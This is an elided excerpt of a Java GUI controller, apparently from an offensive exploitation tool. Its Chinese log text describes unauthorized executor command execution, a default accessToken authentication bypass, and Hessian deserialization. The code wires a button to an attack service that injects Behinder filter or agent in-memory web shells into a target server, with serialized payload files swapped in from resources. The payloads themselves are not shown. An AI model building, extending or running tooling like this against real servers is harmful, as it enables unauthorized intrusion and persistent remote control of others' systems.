...
public class MainController {
    ...
    @FXML
    public ComboBox<String> injectOpt;
    @FXML
    ...
    void injectShellBtn(ActionEvent event) {
        ...
        if (!vulOpt.getValue().equals("api接口未授权Hessian反序列化")){
            ...
            if (injectOpt.getValue().equals("Behinder-Filter")){
                Thread thread = new Thread(new Runnable() {
                    public void run() {
                        AttackService attackService = new AttackService();
                        String code = attackService.injectFilterShellAttack(targetAddress.getText(), httpTimeout.getText(), apiPath.getText());
                        if (code != "error") {
    ...
    void initialize() {
        ...
        logTextArea.setText("[info] 命令执行只实现了Executor未授权命令执行和默认accessToken身份绕过。\n" +
                "[info] 内存马使用了xslt，为了提高可用性提供了冰蝎Filter和Vagent两种内存马\n" +
                "如需自定义可替换resources下的ser文件，其中filter.ser为冰蝎filter内存马、agent.ser为冰蝎agent内存马、xslt.ser会落地为/tmp/2.xslt,\n" +
    ...
    public void initComBoBox() {
        ...
        ObservableList<String> injectOpts = FXCollections.observableArrayList(new String[]{ "Behinder-Filter","Bedinder-agent",});
        this.injectOpt.setPromptText("Behinder-Filter");
        this.injectOpt.setValue("Behinder-Filter");
        this.injectOpt.setItems(injectOpts);
